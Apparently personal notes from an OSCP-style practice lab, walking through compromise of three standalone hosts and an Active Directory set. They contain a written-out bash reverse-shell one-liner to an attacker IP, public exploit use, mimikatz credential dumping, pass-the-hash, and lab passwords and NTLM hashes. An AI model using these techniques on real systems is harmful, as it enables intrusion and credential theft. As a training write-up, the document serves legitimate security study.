Main steps
1. 

Learning points
1. If reverse shells can't seem to connect no matter what try using a lower port like 443 - something could be blocking it on high ports
2. If reverse shell executables aren't running, try generating with `exe-service` or just sending a full PowerShell reverse shell one liner instead
3. `PuTTY` saves user sessions, including passwords; check `WinPEAs` output carefully as it does not highlight it
4. 

Standalone IPs:
1. `192.168.230.143`
2. `192.168.230.144`
3. `192.168.230.145`

AD IPs:
1. `192.168.230.141` - `Eric.Wallows` : ` EricLikesRunning800 `
2. `10.10.190.140`
3. `10.10.190.142`

# Standalone 1: 192.168.230.143

`nmap`
![[Pasted image 20260403221158.png]]

Ports open: FTP, SSH, HTTP (80, 81, 443), `MySQL`, `postgresql`, 3000, 3001: may be related to `Node.js`, 3003

Visiting the webpages on each of the HTTP ports shows that there are both `Apache` and `nginx` web servers running. 80 and 443 return the default `Apache` Ubuntu page, while `81` shows the `nginx` test page. However, this page states that it is for Fedora, not Ubuntu.
![[Pasted image 20260403221606.png]]
![[Pasted image 20260403221557.png]]

I ran `Whatweb` to check the server version, and all 3 ports returned the same thing, leading me to believe that this `nginx` page may be fake.
![[Pasted image 20260403221914.png]]

Response headers in the network console also state `Apache`.
![[Pasted image 20260403221950.png]]

Ran `Feroxbuster` on the site at port 80 and found some interesting directories.
First, there is possibly and `api` directory as this returned 403. The `/config` and `/plugins` directories also returned 403.
![[Pasted image 20260403224420.png]]

Second, navigating to either `/0` or `/index` gives a welcome page to `Pico 3.0.0-alpha.2`, which is a flat file CMS.
![[Pasted image 20260403224603.png]]

Searching up this CMS doesn't return anything interesting, other than the GitHub [repository](https://github.com/picocms/pico) for the project, which states that this is the most recent release.

`Feroxbuster` on port 81 returned nothing with `raft-medium-words.txt`. May have to retry with a larger wordlist.

`Feroxbuster` on port 443 shows that this site is mostly the same as the one on port 80, with a `Pico` index page at the same subdirectory.

Tried further enumerating the `/api` directory on port 80 with `Feroxbuster` and found a page at `/api/heartbeat` which revealed that the server is running an instance of `Aerospike`.
![[Pasted image 20260403231016.png]]

Searching this up shows that `Aerospike` uses a few ports, but notably uses 3000, 3001, and 3003, which are open on this machine. This is a `NoSQL`database for web applications. From the `Aerospike` documentation, it is possible to enumerate the version of the database using their toolkit. I downloaded and installed the toolkit from their [website](https://download.aerospike.com/artifacts/aerospike-tools/latest/), then ran `asinfo -v build -h 192.168.230.143 -p 3000` to check the version number: `5.1.0.1`.
![[Pasted image 20260403231728.png]]

Searching this up immediately gives an OS Command Execution vulnerability for `Aerospike < 5.1.0.3`, CVE-2020-13151. Found a POC on [ExploitDB](https://www.exploit-db.com/exploits/49067), so I downloaded it to try.

The exploit code required a bit of editing, and for me to download a `poc.lua` file from their GitHub [repository](https://github.com/ByteMe1001/CVE-2020-13151-POC-Aerospike-Server-Host-Command-Execution-RCE-/blob/main/poc.lua) , but I was able to get it to work. Unfortunately, the reverse shell functions in the exploit did not seem to work, but I was able to run the `wget` command and note that it successfully made a request to my webserver.
![[Pasted image 20260403233012.png]]

![[Pasted image 20260403233017.png]]
![[Pasted image 20260403233027.png]]

Changed some things in the python file relating to the policy timeout to increase the timeout value.
![[Pasted image 20260404001140.png]]

Eventually, I tried running the listener port on a different port (443) and was able to get a reverse shell as user `aero` and retrieve the user flag.
![[Pasted image 20260404001240.png]]

I do not have the password, so I cannot check `sudo -l`. Nothing interesting in the `SUID` binaries either. Uploaded `pspy64` and noticed that the root user constantly runs the following commands:
```
python /usr/bin/asinfo -v STATUS
/bin/sh -c asadm --asinfo-mode -e "'STATUS'" 
python2.7 /opt/aerospike/bin/asadm --asinfo-mode -e 'STATUS'
```

Checked the `asinfo` binary permissions, and found that it was a `symlink` to `/opt/aerospike/bin/asinfo` - which is owned by the user `aero`.
![[Pasted image 20260404002002.png]]

The actual `symlink` files is also world writable. I tried to `echo` a reverse shell one liner with `"bash -i >& /dev/tcp/192.168.45.160/443 0>&1"` to `/usr/bin/asinfo`, then exited and restarted my listener, and got a shell as root almost immediately.
![[Pasted image 20260404003108.png]]

# Standalone 2: 192.168.230.144

`nmap`
![[Pasted image 20260404003319.png]]

FTP, HTTP, and SSH open. `nmap` found a `.git` repository on the webserver, so I dumped it with `git-dumper`.

Checked the website and it seems to be a normal webpage with no links or usable input fields.
![[Pasted image 20260404003545.png]]

Checked the `git` repo, first with `git status`, the `git restore . && git diff`, then checking the `git log`. I noticed that the most recent update was titled `Security Update` and was made by a user `Stuart`.
![[Pasted image 20260404003746.png]]

Checked this commit and found some credentials.
![[Pasted image 20260404003811.png]]

` stuart@challenge.lab `:` BreakingBad92 `

Tried these credentials against SSH and got a shell as `stuart`, and retrieved the user flag.
![[Pasted image 20260404003924.png]]

`stuart` has no permissions to use `sudo`, and there are no interesting `SUID` binaries.
Checked `/etc/passwd` and found 3 other users on this server: `thato`, `chloe`, and `carla`.
![[Pasted image 20260404004123.png]]

Tried brute forcing the FTP with these 3 usernames but was unsuccessful.

Looking around the file system with `stuart`, I found a `backup` folder in `/opt` that contained 3 site backup ZIP files.
![[Pasted image 20260404010235.png]]

Retrieved them with FTP and tried to unzip them. 1 and 2 were unable to be extracted, and 3 required a password.

Ran `zip2john` to convert the ZIP file to a hash and tried cracking it with `john`.
![[Pasted image 20260404010443.png]]

`john` cracked the ZIP file password: ` codeblue `.

I extracted the files and saw that there was a `configuration.php` file that was not present in the live site. Checked this and found some credentials possibly belonging to `chloe`.
![[Pasted image 20260404010723.png]]
![[Pasted image 20260404010843.png]]

`chloe`: ` Ee24zIK4cDhJHL4H `

Tried both passwords to login as `chloe` and the `$secret` worked.
![[Pasted image 20260404010925.png]]

Checked `sudo -l` and found that `chloe` can run `sudo` on ALL.
![[Pasted image 20260404011002.png]]

Ran `sudo bash` and got a shell as root. Retrieved the root flag.
![[Pasted image 20260404011058.png]]
# Standalone 3: 192.168.230.145

`nmap`
![[Pasted image 20260404011631.png]]

FTP, HTTP, RPC, SMB, RDP open. Port 1978 is unknown but the banner returns `sysmtem windows 6.2`.

The website on port 80 shows a static webpage with no links or usable input fields, but contains a possible username: `samuel haynes`.
![[Pasted image 20260404012208.png]]

`Feroxbuster` did not return anything interesting.

Since port 1978 is open, I tried running the `WiFi Mouse` RCE exploit from [ExploitDB](https://www.exploit-db.com/exploits/50972).
Tried running it with a bunch of different payloads generated by `msfvenom` but could not get a reverse shell. The exploit was working as it was downloading the payload, but the payload would not execute.

Eventually I replaced the payload with a PowerShell reverse shell one liner and this gave me a reverse shell as `offsec`.

Uploaded `WinPEAs` to enumerate privilege escalation vectors.
There is another local user named `zachary` who is an administrator.
![[Pasted image 20260404030426.png]]

Scrolling down, I found a `PuTTY` session owned by `zachary`, including their password in plain text.
![[Pasted image 20260404032648.png]]

`zachary`: ` Th3R@tC@tch3r `

Tried using these credentials to RDP into the machine and was successful. Retrieved the root flag.
![[Pasted image 20260404032921.png]]
# AD Set: 192.168.230.141 (MS01)

Credentials:
1. `Eric.Wallows` : ` EricLikesRunning800 `

`nmap`
![[Pasted image 20260404034339.png]]

Bunch of ports open, but we have credentials to access the machine (assumed breach). Since SSH is open, I'll use that instead of `evil-winrm` for a more stable shell.

Enumerated users with `net user` and found a few other local accounts on MS01:
`Mary.Williams`, `support`
![[Pasted image 20260404034713.png]]

Enumerated domain users and found a large list of users.
![[Pasted image 20260404034741.png]]

Checked `whoami /all`, and noticed that the `Eric.Wallows` user has the `SeImpersonatePrivilege` token.
![[Pasted image 20260404034606.png]]

Uploaded `GodPotato` since I have the token, and was able to successfully run commands as `nt authority\system`.

Tried to spawn a reverse shell and tried adding the current user to the local administrators group but was unsuccessful. The reverse shell would connect but I would be `MS01$` and be unable to run any executables.

So instead, I created a new user and added them to the administrators group.
![[Pasted image 20260404041506.png]]
![[Pasted image 20260404041512.png]]

Now my new user, `user1`, is a local admin.
![[Pasted image 20260404041523.png]]

Uploaded and ran `mimikatz` to begin harvesting credentials.
Got the hashes for 
![[Pasted image 20260404041833.png]]
![[Pasted image 20260404041845.png]]

`OSCP\celia.almeda` : ` e728ecbadfb02f51ce8eed753f3ff3fd `
`MS01\Mary.Williams` : ` 9a3121977ee93af56ebd0ef4f527a35e `

Set up `ligolo-ng` to port forward traffic to begin enumerating the Intranet.

# AD Set: 10.10.190.142 (MS02)

`nmap`
![[Pasted image 20260404044338.png]]

Tried passing the hashes I found above to this machine, and found that `celia.almeda` has `WinRM` access to MS02.
![[Pasted image 20260404044652.png]]

Got access as `celia.almeda` to MS02 with `evil-winrm`.
![[Pasted image 20260404044803.png]]

I noticed a `windows.old` folder in the `C:\` drive. Possibly a backup? Tried to read the SAM hive and found that I had permissions.
![[Pasted image 20260404045656.png]]

Downloaded the two registry hives with `evil-winrm` to my machine to crack it locally with `impacket-secretsdump`.
![[Pasted image 20260404045943.png]]

Dumped the hashes for 4 domain accounts.
![[Pasted image 20260404050018.png]]

`tom_admin`: ` aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc `
`Cheyanne.Adams` : ` aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0 `
`David.Rhys` : ` aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11 `
`Mark.Chetty`: ` aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771 `

The `tom_admin` account seems the most interesting here. I checked for `WinRM` access by passing the hash and found that `tom_admin` can `WinRM` into DC01.
![[Pasted image 20260404050607.png]]

# AD Set: 10.10.190.140 (DC01)

`nmap`
![[Pasted image 20260404043648.png]]

I connected to DC01 as `tom_admin` with `evil-winrm` and passing the hash.
![[Pasted image 20260404050704.png]]

`whoami /all` shows that `tom_admin` is both a local administrator on DC01 as well as a domain administrator for the OSCP domain.
![[Pasted image 20260404050805.png]]

Retrieved the root flag.
![[Pasted image 20260404050833.png]]